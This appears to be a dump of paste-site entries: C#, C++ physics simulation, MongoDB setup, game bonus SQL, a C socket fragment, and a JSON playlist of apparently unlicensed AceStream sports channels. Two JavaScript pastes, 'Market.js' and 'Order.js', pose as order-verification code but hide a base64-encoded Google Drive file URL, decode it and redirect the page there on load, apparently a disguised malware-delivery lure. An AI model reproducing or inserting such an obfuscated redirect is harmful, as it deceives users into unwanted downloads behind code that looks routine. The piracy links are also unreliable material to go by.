            Last = newNode;
        }
        else
        {
            newNode.Previous = Last;
            Last.Next = newNode;
            Last = newNode;
        }
    }
}

internal class OurNode
{
    public KeyValuePair Value { get; set; }
    public OurNode Previous { get; set; }
    public OurNode Next { get; set; }

    public OurNode(KeyValuePair value)
    {
        Value = value;
    }
}

internal struct KeyValuePair
{
    public int Key;
    public int Value;

    public KeyValuePair(int key, int value)
    {
        Key = key;
        Value = value;
    }

    public static KeyValuePair Create(int key, int value) => new(key, value);
}"
zi8v1vtd,Market.js,kammex,JavaScript,Monday 31st of March 2025 01:46:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/490/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3ycgNLkZ,Untitled,Codymawerick,Python,Monday 31st of March 2025 01:16:34 PM CDT,"import pygame
import sys
"
2aqrVTCF,mongodb-cluster-bitnami,nodejsdeveloperskh,JavaScript,Monday 31st of March 2025 01:11:10 PM CDT,"import { MongoClient } from 'mongodb';

const uri =
  'mongodb://my:my@localhost:27017,localhost:27018,localhost:27019/my?replicaSet=rs0';

try {
  const client = new MongoClient(uri);

  await client.connect();
  console.log('Connected to MongoDB Replica Set!');

  const db = client.db('my');
  const collection = db.collection('testcollection');

  const result = await collection.insertOne({
    message: 'Hello, MongoDB Replica Set!',
  });
  console.log('Inserted Document:', result.insertedId);

  await client.close();
} catch (error) {
  console.error('Error connecting to MongoDB:', error);
}
"
aaQJXCSq,mongodb-cluster-bitnami,nodejsdeveloperskh,YAML,Monday 31st of March 2025 01:10:23 PM CDT,"services:
  mongodb-primary:
    image: bitnami/mongodb:7.0.12-debian-12-r2
    environment:
      # MONGODB_ADVERTISED_HOSTNAME: primary-mongodb
      # MONGODB_ROOT_USER: root
      MONGODB_REPLICA_SET_NAME: rs0
      MONGODB_REPLICA_SET_MODE: primary
      MONGODB_REPLICA_SET_KEY: myReplicaSetKey
      MONGODB_ROOT_PASSWORD: my
      MONGODB_USERNAME: my
      MONGODB_PASSWORD: my
      MONGODB_DATABASE: my
      # MONGODB_PORT_NUMBER: 27017
    depends_on:
      - mongodb-secondary
      - mongodb-arbiter
    healthcheck:
      test: ['CMD', 'mongosh', '--eval', ""db.adminCommand('ping')""]
      interval: 5s
      timeout: 5s
      retries: 5
    ports:
      - '27017:27017/tcp'

  mongodb-secondary:
    image: bitnami/mongodb:7.0.12-debian-12-r2
    environment:
      # MONGODB_ADVERTISED_HOSTNAME: mongodb-secondary
      # MONGODB_INITIAL_PRIMARY_HOST: mongo-0
      # MONGODB_INITIAL_PRIMARY_ROOT_USER: root
      # MONGODB_PORT_NUMBER: 27017
      MONGODB_REPLICA_SET_NAME: rs0
      MONGODB_REPLICA_SET_MODE: secondary
      MONGODB_PRIMARY_HOST: mongodb-primary
      MONGODB_PRIMARY_PORT_NUMBER: 27017
      MONGODB_REPLICA_SET_KEY: myReplicaSetKey
      MONGODB_INITIAL_PRIMARY_ROOT_PASSWORD: my
    healthcheck:
      test: ['CMD', 'mongosh', '--eval', ""db.adminCommand('ping')""]
      interval: 5s
      timeout: 5s
      retries: 5
    ports:
      - '27018:27017'

  mongodb-arbiter:
    image: bitnami/mongodb:7.0.12-debian-12-r2
    environment:
      # MONGODB_ADVERTISED_HOSTNAME: mongodb-arbiter
      # MONGODB_INITIAL_PRIMARY_HOST: mongo-0
      # MONGODB_INITIAL_PRIMARY_ROOT_USER: root
      # MONGODB_PORT_NUMBER: 27017
      MONGODB_REPLICA_SET_NAME: rs0
      MONGODB_REPLICA_SET_MODE: arbiter
      MONGODB_PRIMARY_HOST: mongodb-primary
      MONGODB_PRIMARY_PORT_NUMBER: 27017
      MONGODB_REPLICA_SET_KEY: myReplicaSetKey
      MONGODB_INITIAL_PRIMARY_ROOT_PASSWORD: my
    healthcheck:
      test: ['CMD', 'mongosh', '--eval', ""db.adminCommand('ping')""]
      interval: 5s
      timeout: 5s
      retries: 5
    ports:
      - '27019:27017/tcp'"
rrYCuC4P,e-n collisions(v5) - electrons starts with maxwellian,phystota,C++,Monday 31st of March 2025 12:52:24 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 100000
#define Emin 0.0
#define Emax 400.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.01
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 50.0    // electron Maxwell initial distribution
#define M_n 6.6464731E-31 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-3 // 500 microsec time to equalibrate the system

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    // void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
    //     // velocity angles in spherical coordinates
    //     double phi = 2*M_PI*dis(gen);
    //     double cosTheta = 2.0*dis(gen) - 1.0;
    //     double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
    //     energy = E_mean*dis(gen);
        
    //     double speed = sqrt(2*energy*q/m_e);

    //     vx = speed * sinTheta * cos(phi);
    //     vy = speed * sinTheta * sin(phi);
    //     vz = speed * cosTheta;
    // }

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic(N, 0); // precompiled cross-section energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    if (!file5.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file6(""E*f(E).dat"");    
    if (!file6.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file7(""nu_max.dat"");
    if (!file7.is_open()) {
        std::cerr << ""Error opening file7!"" << std::endl;
        return 1;
    }

    // Initialize all electrons
    for (auto& e : electrons) {
//        e.initialize(gen, dis);
        e.initialize(gen, dis, maxwell_electron);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell_neutral);
    }
    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic[i] = interpolate(bin_width*(i+0.5), elastic_CS);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_start = Emin + i*bin_width;
        file3 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_start = Emin + i*bin_width;
        file5 << i*bin_width << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << i*bin_width << "" "" << (i*bin_width)*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }   

    double nu_max = 0.0;
    double nu_max_temp = 0.0;

    for (int i = 0; i < N; i++){
        nu_max_temp = (N_He/Volume)*elastic[i] * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }

    std::cout << nu_max << ""\n"";

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

//    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;
//    int Ne_collided = n_e*0.98;  // in case I want to check smth


    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 1;
    int print_interval = 100;

    for (int t = 0; t < steps; t++){
        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        //reshuffle the indices
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;


        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            if (dis(gen) < nu_elastic/nu_max) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                // int k = neutral_pair(gen);

                // double V0_x_2 = neutrals[k].vx;
                // double V0_y_2 = neutrals[k].vy;
                // double V0_z_2 = neutrals[k].vz;

                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter++;

                e.collided = true;
            }             
        }
                if (t%print_interval == 0){
                // open datafiles to write each time step to see evolution
                std::ostringstream filename;
                filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

                std::ofstream file(filename.str());
                if (!file.is_open()){
                std::cerr << ""Error opening file: "" << filename.str() << std::endl;
                return 1;
                }
                // end opening datafiles for each timestep
                
                // creating histogram each timestep
                for (int i = 0; i < n_e; i++){
                    int bin = (int)( (electrons[i].energy - Emin)/bin_width );
                    if (bin >=0 && bin < N)
                    histo_maxwell[bin]++;
                }

                // writing data each time step
                for (int i = 0; i < N; i++){
                    double bin_start = Emin + i*bin_width;
                    file << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // later need to divide by total partcles number to get normalized distribution
                    histo_maxwell[i] = 0;
                }

                file.close();
                // end writing data each timestep
            }

    }


    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_start = Emin + i*bin_width;
        file4 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
    std::cout << ""Total # of electrons in histo: "" << check << ""\n"";


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Ne collided each timesteps:"" << Ne_collided << ""\n"";
    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
TRSgHr3f,投入严厉地本地 参考代码,Dmaxiya,C++,Monday 31st of March 2025 12:42:30 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int T, k;
string s, t;
string ss[maxn];
map<string, char> ans;

bool judgeAns() {
    string tt = s.substr(0, k);
    for (int i = k; i < s.length(); ++i) {
        map<string, char>::iterator it = ans.find(ss[i]);
        if (it == ans.end()) {
            tt.push_back(s[i]);
            continue;
        }
        if (it->second == 0) {
            continue;
        }
        tt.push_back(it->second);
    }
    return tt == t;
}

void outputAns() {
    cout << ans.size() << endl;
    for (map<string, char>::iterator it = ans.begin(); it != ans.end(); ++it) {
        cout << ""("" << it->first << "","";
        if (it->second != 0) {
            cout << it->second;
        }
        cout << "")"" << endl;
    }
}

bool dfs(int depthS, int depthT) {
    if (depthS == s.length()) {
        if (depthT == t.length() && judgeAns()) {
            outputAns();
            return true;
        }
        return false;
    }

    map<string, char>::iterator it = ans.find(ss[depthS]);
    if (it == ans.end()) {
        ans[ss[depthS]] = 0;
        if (dfs(depthS + 1, depthT)) {
            return true;
        }
        ans[ss[depthS]] = t[depthT];
        if (dfs(depthS + 1, depthT + 1)) {
            return true;
        }
        ans.erase(ss[depthS]);
        return false;
    }

    if (it->second == 0) {
        return dfs(depthS + 1, depthT);
    }
    if (it->second != t[depthT]) {
        return false;
    }
    return dfs(depthS + 1, depthT + 1);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> T;
    while (T--) {
        ans.clear();
        cin >> s >> t >> k;
        s = "" "" + s;
        t = "" "" + t;
        for (int i = k; i < s.length(); ++i) {
            ss[i] = s.substr(i - k + 1, k);
        }
        dfs(k, k);
    }

    return 0;
}
"
WTHi9DLD,Untitled,Locative,SQL,Monday 31st of March 2025 12:37:23 PM CDT,"-- [ Оплата за: март]
 
--------- [ Отработанное время: ]
 
Locative: 2 (FUN) 174 (x100) -- 176
Зилиус:  0 (x100) -- 0
Khyntia: 68 (FUN), 0 (x100) -- 68
jegerm  - EN GM: 170 (FUN), 6 (x100) -- 176
Mairena: 0 (FUN) 104 (x100) -- 104
Lorad: 0 (x100) -- 0


--------- [ Бонусы: ]

UPDATE `bonus` SET `gold`=gold+4000 WHERE `id`='1407530'; -- Locative(3000ГМ + 1000РГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 4000, '+4000 золотых бонусов - з/п Ргм Locative за март');

UPDATE `bonus` SET `gold`=gold+0 WHERE `id`='229884'; -- Зилиус (ГМ)
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (229884, NOW(), 0, '+0 золотых бонусов - з/п ГМ Зилиус за март');

UPDATE `bonus` SET `gold`=gold+1500 WHERE `id`='949105'; -- Khyntia (ГМ).
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (949105, NOW(), 1500, '+1500 золотых бонусов - з/п ГМ Khyntia за март'); 

UPDATE `bonus` SET `gold`=gold+3500 WHERE `id`='455260'; -- Jegerm (EN GM) + md FB.
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (455260, NOW(), 3500, '+3500 золотых бонусов - з/п ГМ Jegerm за март'); 

UPDATE `bonus` SET `gold`=gold+3000 WHERE `id`='1407530'; -- Mairena
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1407530, NOW(), 3000, '+3000 золотых бонусов - з/п ГМ Mairena за март'); 


-- Техническая поддержка

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='456853'; -- Seanone
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (456853, NOW(), 1000, '+1000 золотых бонусов - з/п тех.поддержки Seanone за март'); 


-- QA Team

UPDATE `bonus` SET `gold`=gold+1000 WHERE `id`='211220'; -- nastyasia
INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (211220, NOW(), 1000, '+1000 золотых бонусов - з/п QA-тестер nastyasia за март'); 

"
KWCHJRps,clone test,Anistorm,JSON,Monday 31st of March 2025 12:32:57 PM CDT,"{
    ""name"": ""🎈 Llista Ani 😎"",
    ""author"": ""Última actualització: 23/02/2025"",
    ""image"": ""https://i.gyazo.com/7d12c8f8374e9c1417051387b90fdfc4.jpg"",
    ""url"":""https://pastebin.com/raw/KWCHJRps"",
	""info"": ""Última actualització: 23/02/2025"",
    ""groups"":[
{""name"": ""LA LIGA"",
            ""image"": ""https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/LaLiga_logo_2023.svg/241px-LaLiga_logo_2023.svg.png"",
            ""stations"": [
{
                    ""name"": ""LA LIGA [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://d3de78aebe544611a2347f54d5796bd87f16c92d"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA [MULTIAUDIO] (#2)"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://6d05b31e5e8fdae312fbd57897363a7b10ddb163"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [1080]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://94d34491106e00394835c8cb68aa94481339b53f"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [1080] (#2)"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://cc9b7f5fe416069a2110da0909b0f915043c468b"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA [720]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://1bc437bce57b4b0450f6d1f8d818b7e97000745e"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA [NEW LOOP]"",
                    ""image"": ""https://i.imgur.com/3SlR9A2.png"",
                    ""url"": ""acestream://cc9b7f5fe416069a2110da0909b0f915043c468b"",
                    ""isHost"": true
                },
                {
                    ""name"": ""LA LIGA 2 [1080]"",
                    ""image"": ""https://i.imgur.com/cyesAMN.png"",
                    ""url"": ""acestream://83c6c4942d69f4aa324aa746c5d7dbfd7d1572b3"",
                    ""isHost"": true
                },
{
                    ""name"": ""LA LIGA 2 [720]"",
                    ""image"": ""https://i.imgur.com/cyesAMN.png"",
                    ""url"": ""acestream://f31a586422c9244196c810c84b6c85da350318a5"",
                    ""isHost"": true
                },
                {
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://110d441ddc9713a7452588770d2bc85504672f47"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO] (#2)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://ec29289b0b14756e686c03a501bae1efa05be70c"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [MULTIAUDIO] (#3)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://6de4794cd02f88f14354b5996823413a59a1de0f"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [720]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://8c8c1e047a1c5ed213ba74722a5345dc55c3c0eb"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [FHD]"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://b5f549da9cafaffab01fb04567ce8a5ad4416b5c"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA [FHD] (#2)"",
                    ""image"": ""https://i.imgur.com/kbMztFO.png"",
                    ""url"": ""acestream://a5144874f66a0872fd0b5a484cd426eb7d8eaa26"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [MULTIAUDIO]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://97ba38d47680954be40e48bd8f43e17222fefecb"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [720]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://51dbbfb42f8091e4ea7a2186b566a40e780953d9"",
                    ""isHost"": true
                },
{
                    ""name"": ""DAZN LA LIGA 2 [NEW ERA]"",
                    ""image"": ""https://i.imgur.com/PgMDnz4.png"",
                    ""url"": ""acestream://fb51ef5294e99767811a3fa95a1933fb864e9ff3"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [1080]"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://608b0faf7d3d25f6fe5dba13d5e4b4142949990e"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [1080] (#2)"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://94d34491106e00394835c8cb68aa94481339b53f"",
                    ""isHost"": true
                },
{
                    ""name"": ""LALIGA TV BAR [NEW ERA II]"",
                    ""image"": ""https://www.thesportsdb.com/images/media/channel/logo/f9y6oe1692444384.png"",
                    ""url"": ""acestream://580fa1e7623d514a94e8585f90c42eda09d5e4f1"",
                    ""isHost"": true
                },
]
},
]
},"
duc7X6We,Order.js,dentira,JavaScript,Monday 31st of March 2025 11:58:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/997/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EUswBcsh,scm_rights,teknoraver,C,Monday 31st of March 2025 11:50:33 AM CDT,"#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define pexit(msg) do { perror(msg); exit(1); } while (0)

static int sendfd(int sockfd, int fd)
